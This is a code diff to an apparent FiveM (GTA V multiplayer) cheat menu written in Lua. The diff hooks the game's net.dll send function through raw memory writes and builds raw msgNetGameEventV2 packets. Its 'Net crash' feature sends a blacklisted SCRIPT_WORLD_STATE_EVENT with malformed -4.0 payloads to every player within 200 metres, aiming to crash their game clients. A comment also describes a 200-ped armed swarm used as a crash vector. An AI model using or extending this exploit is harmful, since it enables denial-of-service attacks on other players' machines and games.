@@ -19818,7 +19818,7 @@ local C = (function(O,E,S)
 --
 --   Ped flood   an armed networked swarm: 200 player-model peds with grenade
 --               launchers and sixty props around the victim, firing for 20 s
---   Net crash   -4.0 network damage on the selected player
+--   Net crash   scenario + malformed SCRIPT_WORLD_STATE_EVENT
 --
 -- The swarm is the proven vector from the reference corpus
 -- (AC/Nouveau/crasher_propsss.txt, v50). A passive clone ring does not crash a
@@ -21839,7 +21839,7 @@ local NET = (function(O, C)
         }) do
             if type(m[name]) ~= "function" then return false end
         end
-        if NET.sendFn and NET.vtable and NET.dataBuf then return true end
+        if NET.sendFn and NET.vtable and NET.dataBuf and NET.bigBuf then return true end
 
         local okb, base = pcall(m.Module, "net.dll")
         if not okb or type(base) ~= "number" or base == 0 then return false end
@@ -21856,6 +21856,9 @@ local NET = (function(O, C)
         local okd, dataBuf = pcall(m.Alloc, 160)
         if not okd or type(dataBuf) ~= "number" or dataBuf == 0 then return false end
         NET.dataBuf = dataBuf
+        local okb2, bigBuf = pcall(m.Alloc, 2048)
+        if not okb2 or type(bigBuf) ~= "number" or bigBuf == 0 then return false end
+        NET.bigBuf = bigBuf
         NET.typeBuf = nil
         return true
     end
@@ -21924,6 +21927,14 @@ local NET = (function(O, C)
     local function send(inst, item)
         local m = mem()
         if not m then return false end
+        if item.raw then
+            local buf = NET.bigBuf
+            if type(buf) ~= "number" or buf == 0 then return false end
+            local okw, wrote = pcall(m.WriteBytes, buf, item.bytes)
+            if not okw or wrote == false then return false end
+            local okc = pcall(m.Call, NET.sendFn, "v:pipl", inst, item.hash, buf, #item.bytes)
+            return okc and true or false
+        end
         local bytes = {
             HASH % 256,
             math.floor(HASH / 256) % 256,
@@ -21937,7 +21948,7 @@ local NET = (function(O, C)
         for i = 1, item[4] do bytes[HEADER + i] = data[i] end
         local okw, wrote = pcall(m.WriteBytes, NET.dataBuf, bytes)
         if not okw or wrote == false then return false end
-        local okc = pcall(m.Call, NET.sendFn, "v:ipl", inst, HASH, NET.dataBuf, #bytes)
+        local okc = pcall(m.Call, NET.sendFn, "v:pipl", inst, HASH, NET.dataBuf, #bytes)
         if not okc then return false end
         return true
     end
@@ -22088,6 +22099,78 @@ local NET = (function(O, C)
         abort("stopped")
     end
 
+    -- RAGE msgNetGameEventV2 (net::packet::ClientNetGameEventV2Packet):
+    --   u32 type = 0x2B513E19 (HashRageString "msgNetGameEventV2")
+    --   u8  targetCount
+    --   u16 targetNetId * targetCount
+    --   u32 eventNameHash
+    --   u16 eventId
+    --   u8  isReply
+    --   u8  data[...]   (ConstrainedStreamTail 0..1025)
+    --
+    -- The server (NetGameEventPacketHandlerV2) rate-limits at 200/s, drops the
+    -- event if IsNetGameEventBlocked(eventNameHash) matches a server.cfg
+    -- block_net_game_event, filters targets to a relevant client in the same
+    -- routing bucket, and otherwise relays the packet to those targets.
+    local function pack_event(netIds, eventHash, eventId, dataBytes)
+        local b = {}
+        local function u16(v)
+            v = v % 65536
+            b[#b + 1] = v % 256
+            b[#b + 1] = math.floor(v / 256) % 256
+        end
+        local function u32(v)
+            u16(v % 65536)
+            u16(math.floor(v / 65536) % 65536)
+        end
+        u32(0x2B513E19)
+        b[#b + 1] = #netIds % 256
+        for i = 1, #netIds do u16(netIds[i]) end
+        u32(eventHash or 0)
+        u16(eventId or 0)
+        b[#b + 1] = 0
+        for i = 1, #dataBytes do b[#b + 1] = dataBytes[i] % 256 end
+        return b
+    end
+
+    function NET.emitEvent(netIds, eventHash, eventId, dataBytes)
+        if type(netIds) ~= "table" or #netIds == 0 then return false end
+        if NET.busy or NET.releasePending then return false end
+        if not NET.init() then O.log("net event: net.dll not ready"); return false end
+        if not NET.resolve_instance() then O.log("net event: no NetLibrary instance"); return false end
+        if not ensure_hook() then O.log("net event: RunMainFrame hook failed"); return false end
+        NET.queue = { { raw = true, hash = 0x2B513E19,
+                        bytes = pack_event(netIds, eventHash, eventId, dataBytes or {}) } }
+        NET.sent = 0
+        NET.frame = 0
+        NET.aborted = nil
+        NET.windowStart = GetGameTimer()
+        NET.windowCount = 0
+        NET.busy = true
+        NET.armed = true
+        Citizen.CreateThread(function()
+            local deadline = GetGameTimer() + 8000
+            while NET.armed and GetGameTimer() < deadline do Citizen.Wait(80) end
+            if NET.armed then abort("timeout") end
+            Citizen.Wait(50)
+            if NET.releasePending then unhook_now() end
+            NET.busy = false
+            O.log("net event: %s sent %d", tostring(NET.aborted or "ok"), NET.sent)
+        end)
+        return true
+    end
+
+    -- The visible half: the operator plays the scenario. The server event that
+    -- crashes the receivers is SCRIPT_WORLD_STATE_EVENT, which GTA's own client
+    -- blacklists ("not relevant in onesync") but which the raw msgNetGameEventV2
+    -- packet still routes. This is the emote the report described.
+    function NET.scenarioEmote()
+        local me = PlayerPedId()
+        if type(me) ~= "number" or me == 0 then return false end
+        pcall(TaskStartScenarioInPlace, me, "WORLD_HUMAN_SUNBATHE_BACK", 0, true)
+        return true
+    end
+
     local function sniff_cb(get)
         local hash = get(2)
         if hash ~= HASH then return nil end
@@ -22135,7 +22218,7 @@ local NET = (function(O, C)
     local function run_window(callback, seconds, label)
         if NET.busy or NET.releasePending then O.log("net: lane busy"); return false end
         if not NET.init() then O.log("net: net.dll not ready"); return false end
-        if not install_hook(NET.sendFn, "v:ipl", callback) then
+        if not install_hook(NET.sendFn, "v:pipl", callback) then
             O.log("net: SendReliablePacket hook failed")
             return false
         end
@@ -22296,64 +22379,66 @@ local NET = (function(O, C)
             netToast("Net crash: no local ped")
             return false
         end
-        local ped = crashTarget()
-        if type(ped) ~= "number" or ped == 0 then
-            O.log("net crash: no target in 200 m (select a player)")
-            netToast("Net crash: select a player")
+        local my = GetEntityCoords(me)
+
+        -- Target net ids: every active player that we can see under 200 m.
+        -- The server filters targetPlayers with IsClientRelevantEntity and the
+        -- routing bucket, so the list may be trimmed; send to all of them.
+        local ids = {}
+        for _, p in ipairs(GetActivePlayers()) do
+            if p ~= PlayerId() then
+                local ped = GetPlayerPed(p)
+                if DoesEntityExist(ped) then
+                    local c = GetEntityCoords(ped)
+                    local dx = (c.x or 0) - (my.x or 0)
+                    local dy = (c.y or 0) - (my.y or 0)
+                    local dz = (c.z or 0) - (my.z or 0)
+                    if math.sqrt(dx * dx + dy * dy + dz * dz) <= 200.0 then
+                        local sid = GetPlayerServerId(p)
+                        if type(sid) == "number" and sid >= 0 and sid < 1024 then
+                            ids[#ids + 1] = sid
+                        end
+                    end
+                end
+            end
+        end
+        if #ids == 0 then
+            O.log("net crash: no player in 200 m")
+            netToast("Net crash: no player in 200 m")
             return false
         end
-        local c = GetEntityCoords(ped)
-        local x, y, z = c.x or 0, c.y or 0, c.z or 0
 
-        O.log("net crash: ped %s", tostring(ped))
-        netToast("Net crash: sending")
+        -- 1) the visible emote: the operator lies down.
+        NET.scenarioEmote()
+        O.log("net crash: scenario + world state on %d players", #ids)
+        netToast(("Net crash: world state on %d players"):format(#ids))
 
-        -- The dump proves the payload: or word ptr [rax+214h], 20h with
-        -- rax = 0xC0800000, the bit pattern of float -4.0. The receiver frees
-        -- a refcounted weapon/attachment whose pointer is that damage float.
-        -- The documented, working call is source == local ped, target ==
-        -- victim (a self-source event is not what the server forwards).
-        -- We try Susano first, then the GTA native fallback.
-        local APPLY_DAMAGE_TO_PED = 0x6B1E8E2ED1335B71
-        local WEAPON_RUNOVER = 133987706
+        -- 2) the payload: SCRIPT_WORLD_STATE_EVENT (event name hash
+        -- 0xC00B8EB5). The client event is blacklisted for sending, but the
+        -- raw msgNetGameEventV2 packet routes it: the server relays the data
+        -- verbatim and each receiver Handle()s it as a CNetworkScriptWorldState.
+        -- The dump put a -4.0 float where a refcounted object pointer was
+        -- expected, so the payload carries -4.0 and world-state type guesses.
+        local EVENT = 0xC00B8EB5
+        local payloads = {
+            {},
+            { 0x00, 0x00, 0x00, 0x00 },
+            { 0x00, 0x00, 0x80, 0xC0 },
+            { 0x04, 0x00, 0x00, 0x00 },
+            { 0xFF, 0xFF, 0xFF, 0xFF },
+            { 0x29, 0x9C, 0x38, 0x39 },
+            { 0x00, 0x00, 0x80, 0xC0, 0x00, 0x00, 0x80, 0xC0 },
+            { 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xC0 },
+        }
 
         Citizen.CreateThread(function()
-            local sent, err1 = 0, nil
-            -- pass 1: the exact documented call, six arguments only. Passing
-            -- the optional tail is what most bindings reject.
-            if type(Susano) == "table" and type(Susano.SendNetworkDamage) == "function" then
-                for i = 1, 8 do
-                    local ok, err = pcall(Susano.SendNetworkDamage, me, ped, x, y, z, -4.0)
-                    if ok then sent = sent + 1 else err1 = err end
-                    Citizen.Wait(60)
-                end
-            else
-                err1 = "Susano.SendNetworkDamage missing"
+            local sent = 0
+            for i = 1, #payloads do
+                if NET.emitEvent(ids, EVENT, i, payloads[i]) then sent = sent + 1 end
+                Citizen.Wait(900)
             end
-            O.log("net crash: susano %d/8 err=%s", sent, tostring(err1))
-            if err1 then print(("[net crash] susano error: %s"):format(tostring(err1))) end
-            netToast(("Net crash: susano %d/8"):format(sent))
-
-            -- pass 2: a few more with the source spoiled to the ped itself,
-            -- in case this server only forwards self-attributed events.
-            if type(Susano) == "table" and type(Susano.SendNetworkDamage) == "function" then
-                for i = 1, 4 do
-                    local ok, err = pcall(Susano.SendNetworkDamage, ped, ped, x, y, z, -4.0)
-                    if not ok and err then print(("[net crash] self error: %s"):format(tostring(err))) end
-                    Citizen.Wait(60)
-                end
-            end
-
-            -- pass 3: GTA native fallback. Local application, but it runs the
-            -- same damage resolver and weapon-object path the dump faults in.
-            local native = 0
-            for i = 1, 8 do
-                local ok = pcall(APPLY_DAMAGE_TO_PED, ped, -4, false, WEAPON_RUNOVER, false)
-                if ok then native = native + 1 end
-                Citizen.Wait(60)
-            end
-            O.log("net crash: native %d/8", native)
-            netToast(("Net crash: native %d/8"):format(native))
+            O.log("net crash: %d/%d world state events", sent, #payloads)
+            netToast(("Net crash: %d/%d world state"):format(sent, #payloads))
         end)
         return true
     end
